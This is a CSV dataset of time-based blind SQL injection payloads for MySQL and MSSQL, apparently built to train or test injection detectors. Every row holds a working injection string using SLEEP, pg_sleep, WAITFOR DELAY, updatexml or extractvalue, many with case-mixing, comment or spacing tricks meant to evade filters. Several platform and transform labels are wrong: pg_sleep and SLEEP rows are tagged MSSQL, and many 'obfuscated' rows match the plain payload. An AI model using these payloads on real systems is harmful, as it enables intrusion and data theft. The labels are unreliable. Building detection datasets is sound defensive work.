Query,platform,base_type,original_id,transform_type,delay_value,obfuscation
"' AND IF(1=1, SLEEP(5), 0) -- ",MySQL,direct_time,251,time-based-nested_fn,5,nested_fn
"' anD iF(1=1, SleEp(5), 0) -- ",MySQL,direct_time,252,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,253,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MySQL,boolean_or_error,254,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MySQL,boolean_or_error,255,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MySQL,boolean_or_error,256,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MySQL,boolean_or_error,257,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MySQL,boolean_or_error,258,time-based-blind,7,none
"' AND IF(1=1, SLEEP(7), 0) -- ",MySQL,direct_time,259,time-based-none,7,none
"' AND IF(1=1, S/*obf*/LEEP(7), 0) -- ",MySQL,direct_time,260,time-based-injected_comment,7,injected_comment
"'   AND  IF(1=1,     SLEEP(7),   0)     --   ",MySQL,direct_time,261,time-based-extra_spaces,7,extra_spaces
"' AND IF(1=1, SLEEP(7), 0) -- ",MySQL,direct_time,262,time-based-nested_fn,7,nested_fn
"' and if(1=1, slEEP(7), 0) -- ",MySQL,direct_time,263,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,264,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MySQL,boolean_or_error,265,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MySQL,boolean_or_error,266,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MySQL,boolean_or_error,267,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MySQL,boolean_or_error,268,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MySQL,boolean_or_error,269,time-based-blind,10,none
"' AND IF(1=1, SLEEP(10), 0) -- ",MySQL,direct_time,270,time-based-none,10,none
"' AND IF(1=1, S/*obf*/LEEP(10), 0) -- ",MySQL,direct_time,271,time-based-injected_comment,10,injected_comment
"'    AND  IF(1=1,   SLEEP(10),     0)    --    ",MySQL,direct_time,272,time-based-extra_spaces,10,extra_spaces
"' AND IF(1=1, SLEEP(10), 0) -- ",MySQL,direct_time,273,time-based-nested_fn,10,nested_fn
"' aND iF(1=1, sleEP(10), 0) -- ",MySQL,direct_time,274,time-based-mixed_case,10,mixed_case
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,275,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MSSQL,boolean_or_error,276,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MSSQL,boolean_or_error,277,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MSSQL,boolean_or_error,278,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MSSQL,boolean_or_error,279,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MSSQL,boolean_or_error,280,time-based-blind,1,none
'; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,281,time-based-none,1,none
'; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,282,time-based-injected_comment,1,injected_comment
';  WAITFOR    DELAY   '00:00:01'--,MSSQL,direct_time,283,time-based-extra_spaces,1,extra_spaces
'; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,284,time-based-nested_fn,1,nested_fn
'; WAiTFor dELay '00:00:01'--,MSSQL,direct_time,285,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,286,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MSSQL,boolean_or_error,287,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MSSQL,boolean_or_error,288,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MSSQL,boolean_or_error,289,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MSSQL,boolean_or_error,290,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MSSQL,boolean_or_error,291,time-based-blind,3,none
'; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,292,time-based-none,3,none
'; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,293,time-based-injected_comment,3,injected_comment
';     WAITFOR     DELAY     '00:00:03'--,MSSQL,direct_time,294,time-based-extra_spaces,3,extra_spaces
'; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,295,time-based-nested_fn,3,nested_fn
'; waITFOr deLAY '00:00:03'--,MSSQL,direct_time,296,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,297,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MSSQL,boolean_or_error,298,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MSSQL,boolean_or_error,299,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MSSQL,boolean_or_error,300,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MSSQL,boolean_or_error,301,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MSSQL,boolean_or_error,302,time-based-blind,5,none
'; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,303,time-based-none,5,none
'; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,304,time-based-injected_comment,5,injected_comment
';     WAITFOR    DELAY   '00:00:05'--,MSSQL,direct_time,305,time-based-extra_spaces,5,extra_spaces
'; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,306,time-based-nested_fn,5,nested_fn
'; WAITfoR DelaY '00:00:05'--,MSSQL,direct_time,307,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,308,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MSSQL,boolean_or_error,309,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MSSQL,boolean_or_error,310,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MSSQL,boolean_or_error,311,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MSSQL,boolean_or_error,312,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MSSQL,boolean_or_error,313,time-based-blind,7,none
'; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,314,time-based-none,7,none
'; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,315,time-based-injected_comment,7,injected_comment
';  WAITFOR   DELAY  '00:00:07'--,MSSQL,direct_time,316,time-based-extra_spaces,7,extra_spaces
'; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,317,time-based-nested_fn,7,nested_fn
'; WaiTfOr DELAy '00:00:07'--,MSSQL,direct_time,318,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,319,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MSSQL,boolean_or_error,320,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MSSQL,boolean_or_error,321,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MSSQL,boolean_or_error,322,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MSSQL,boolean_or_error,323,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MSSQL,boolean_or_error,324,time-based-blind,10,none
'; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,325,time-based-none,10,none
'; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,326,time-based-injected_comment,10,injected_comment
';    WAITFOR   DELAY   '00:00:10'--,MSSQL,direct_time,327,time-based-extra_spaces,10,extra_spaces
'; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,328,time-based-nested_fn,10,nested_fn
'; waITFoR deLAY '00:00:10'--,MSSQL,direct_time,329,time-based-mixed_case,10,mixed_case
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,330,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MSSQL,boolean_or_error,331,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MSSQL,boolean_or_error,332,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MSSQL,boolean_or_error,333,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MSSQL,boolean_or_error,334,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MSSQL,boolean_or_error,335,time-based-blind,1,none
'; IF (1=1) WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,336,time-based-none,1,none
'; IF (1=1) WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,337,time-based-injected_comment,1,injected_comment
';    IF    (1=1)    WAITFOR    DELAY  '00:00:01'--,MSSQL,direct_time,338,time-based-extra_spaces,1,extra_spaces
'; IF (1=1) WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,339,time-based-nested_fn,1,nested_fn
'; IF (1=1) WaiTfOr DeLAY '00:00:01'--,MSSQL,direct_time,340,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,341,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MSSQL,boolean_or_error,342,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MSSQL,boolean_or_error,343,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MSSQL,boolean_or_error,344,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MSSQL,boolean_or_error,345,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MSSQL,boolean_or_error,346,time-based-blind,3,none
'; IF (1=1) WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,347,time-based-none,3,none
'; IF (1=1) WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,348,time-based-injected_comment,3,injected_comment
';   IF   (1=1)  WAITFOR  DELAY     '00:00:03'--,MSSQL,direct_time,349,time-based-extra_spaces,3,extra_spaces
'; IF (1=1) WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,350,time-based-nested_fn,3,nested_fn
'; IF (1=1) waitFOr dELAy '00:00:03'--,MSSQL,direct_time,351,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,352,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MSSQL,boolean_or_error,353,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MSSQL,boolean_or_error,354,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MSSQL,boolean_or_error,355,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MSSQL,boolean_or_error,356,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MSSQL,boolean_or_error,357,time-based-blind,5,none
'; IF (1=1) WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,358,time-based-none,5,none
'; IF (1=1) WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,359,time-based-injected_comment,5,injected_comment
';   IF   (1=1)     WAITFOR    DELAY     '00:00:05'--,MSSQL,direct_time,360,time-based-extra_spaces,5,extra_spaces
'; IF (1=1) WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,361,time-based-nested_fn,5,nested_fn
'; iF (1=1) WAitfOR deLay '00:00:05'--,MSSQL,direct_time,362,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,363,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MSSQL,boolean_or_error,364,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MSSQL,boolean_or_error,365,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MSSQL,boolean_or_error,366,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MSSQL,boolean_or_error,367,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MSSQL,boolean_or_error,368,time-based-blind,7,none
'; IF (1=1) WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,369,time-based-none,7,none
'; IF (1=1) WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,370,time-based-injected_comment,7,injected_comment
';  IF   (1=1)   WAITFOR     DELAY     '00:00:07'--,MSSQL,direct_time,371,time-based-extra_spaces,7,extra_spaces
'; IF (1=1) WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,372,time-based-nested_fn,7,nested_fn
'; If (1=1) waITFoR dElAy '00:00:07'--,MSSQL,direct_time,373,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,374,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MSSQL,boolean_or_error,375,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MSSQL,boolean_or_error,376,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MSSQL,boolean_or_error,377,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MSSQL,boolean_or_error,378,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MSSQL,boolean_or_error,379,time-based-blind,10,none
'; IF (1=1) WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,380,time-based-none,10,none
'; IF (1=1) WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,381,time-based-injected_comment,10,injected_comment
';   IF     (1=1)     WAITFOR  DELAY    '00:00:10'--,MSSQL,direct_time,382,time-based-extra_spaces,10,extra_spaces
'; IF (1=1) WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,383,time-based-nested_fn,10,nested_fn
'; IF (1=1) wAiTFOr deLAy '00:00:10'--,MSSQL,direct_time,384,time-based-mixed_case,10,mixed_case
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,385,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MSSQL,boolean_or_error,386,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MSSQL,boolean_or_error,387,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MSSQL,boolean_or_error,388,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MSSQL,boolean_or_error,389,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MSSQL,boolean_or_error,390,time-based-blind,1,none
1; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,391,time-based-none,1,none
1; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,392,time-based-injected_comment,1,injected_comment
1;   WAITFOR  DELAY     '00:00:01'--,MSSQL,direct_time,393,time-based-extra_spaces,1,extra_spaces
1; WAITFOR DELAY '00:00:01'--,MSSQL,direct_time,394,time-based-nested_fn,1,nested_fn
1; waiTFor DELaY '00:00:01'--,MSSQL,direct_time,395,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,396,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MSSQL,boolean_or_error,397,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MSSQL,boolean_or_error,398,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MSSQL,boolean_or_error,399,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MSSQL,boolean_or_error,400,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MSSQL,boolean_or_error,401,time-based-blind,3,none
1; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,402,time-based-none,3,none
1; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,403,time-based-injected_comment,3,injected_comment
1;  WAITFOR    DELAY  '00:00:03'--,MSSQL,direct_time,404,time-based-extra_spaces,3,extra_spaces
1; WAITFOR DELAY '00:00:03'--,MSSQL,direct_time,405,time-based-nested_fn,3,nested_fn
1; wAiTFOr DelaY '00:00:03'--,MSSQL,direct_time,406,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,407,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MSSQL,boolean_or_error,408,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MSSQL,boolean_or_error,409,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MSSQL,boolean_or_error,410,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MSSQL,boolean_or_error,411,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MSSQL,boolean_or_error,412,time-based-blind,5,none
1; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,413,time-based-none,5,none
1; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,414,time-based-injected_comment,5,injected_comment
1;  WAITFOR     DELAY   '00:00:05'--,MSSQL,direct_time,415,time-based-extra_spaces,5,extra_spaces
1; WAITFOR DELAY '00:00:05'--,MSSQL,direct_time,416,time-based-nested_fn,5,nested_fn
1; WaItFoR dELay '00:00:05'--,MSSQL,direct_time,417,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,418,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MSSQL,boolean_or_error,419,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MSSQL,boolean_or_error,420,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MSSQL,boolean_or_error,421,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MSSQL,boolean_or_error,422,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MSSQL,boolean_or_error,423,time-based-blind,7,none
1; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,424,time-based-none,7,none
1; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,425,time-based-injected_comment,7,injected_comment
1;   WAITFOR     DELAY  '00:00:07'--,MSSQL,direct_time,426,time-based-extra_spaces,7,extra_spaces
1; WAITFOR DELAY '00:00:07'--,MSSQL,direct_time,427,time-based-nested_fn,7,nested_fn
1; WAItfoR dElAY '00:00:07'--,MSSQL,direct_time,428,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,429,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MSSQL,boolean_or_error,430,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MSSQL,boolean_or_error,431,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MSSQL,boolean_or_error,432,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MSSQL,boolean_or_error,433,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MSSQL,boolean_or_error,434,time-based-blind,10,none
1; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,435,time-based-none,10,none
1; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,436,time-based-injected_comment,10,injected_comment
1;  WAITFOR     DELAY    '00:00:10'--,MSSQL,direct_time,437,time-based-extra_spaces,10,extra_spaces
1; WAITFOR DELAY '00:00:10'--,MSSQL,direct_time,438,time-based-nested_fn,10,nested_fn
1; waitFOR delAY '00:00:10'--,MSSQL,direct_time,439,time-based-mixed_case,10,mixed_case
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,440,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MSSQL,boolean_or_error,441,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MSSQL,boolean_or_error,442,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MSSQL,boolean_or_error,443,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MSSQL,boolean_or_error,444,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MSSQL,boolean_or_error,445,time-based-blind,1,none
'+WAITFOR+DELAY+'00:00:01';--,MSSQL,direct_time,446,time-based-none,1,none
'+WAITFOR+DELAY+'00:00:01';--,MSSQL,direct_time,447,time-based-injected_comment,1,injected_comment
'+WAITFOR+DELAY+'00:00:01';--,MSSQL,direct_time,448,time-based-extra_spaces,1,extra_spaces
'+WAITFOR+DELAY+'00:00:01';--,MSSQL,direct_time,449,time-based-nested_fn,1,nested_fn
'+waitfOr+DELay+'00:00:01';--,MSSQL,direct_time,450,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,451,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MSSQL,boolean_or_error,452,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MSSQL,boolean_or_error,453,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MSSQL,boolean_or_error,454,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MSSQL,boolean_or_error,455,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MSSQL,boolean_or_error,456,time-based-blind,3,none
'+WAITFOR+DELAY+'00:00:03';--,MSSQL,direct_time,457,time-based-none,3,none
'+WAITFOR+DELAY+'00:00:03';--,MSSQL,direct_time,458,time-based-injected_comment,3,injected_comment
'+WAITFOR+DELAY+'00:00:03';--,MSSQL,direct_time,459,time-based-extra_spaces,3,extra_spaces
'+WAITFOR+DELAY+'00:00:03';--,MSSQL,direct_time,460,time-based-nested_fn,3,nested_fn
'+Waitfor+dElAy+'00:00:03';--,MSSQL,direct_time,461,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,462,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MSSQL,boolean_or_error,463,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MSSQL,boolean_or_error,464,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MSSQL,boolean_or_error,465,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MSSQL,boolean_or_error,466,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MSSQL,boolean_or_error,467,time-based-blind,5,none
'+WAITFOR+DELAY+'00:00:05';--,MSSQL,direct_time,468,time-based-none,5,none
'+WAITFOR+DELAY+'00:00:05';--,MSSQL,direct_time,469,time-based-injected_comment,5,injected_comment
'+WAITFOR+DELAY+'00:00:05';--,MSSQL,direct_time,470,time-based-extra_spaces,5,extra_spaces
'+WAITFOR+DELAY+'00:00:05';--,MSSQL,direct_time,471,time-based-nested_fn,5,nested_fn
'+Waitfor+DelAY+'00:00:05';--,MSSQL,direct_time,472,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,473,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MSSQL,boolean_or_error,474,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MSSQL,boolean_or_error,475,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MSSQL,boolean_or_error,476,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MSSQL,boolean_or_error,477,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MSSQL,boolean_or_error,478,time-based-blind,7,none
'+WAITFOR+DELAY+'00:00:07';--,MSSQL,direct_time,479,time-based-none,7,none
'+WAITFOR+DELAY+'00:00:07';--,MSSQL,direct_time,480,time-based-injected_comment,7,injected_comment
'+WAITFOR+DELAY+'00:00:07';--,MSSQL,direct_time,481,time-based-extra_spaces,7,extra_spaces
'+WAITFOR+DELAY+'00:00:07';--,MSSQL,direct_time,482,time-based-nested_fn,7,nested_fn
'+wAitfor+dElAY+'00:00:07';--,MSSQL,direct_time,483,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MSSQL,boolean_or_error,484,time-based-blind,10,none
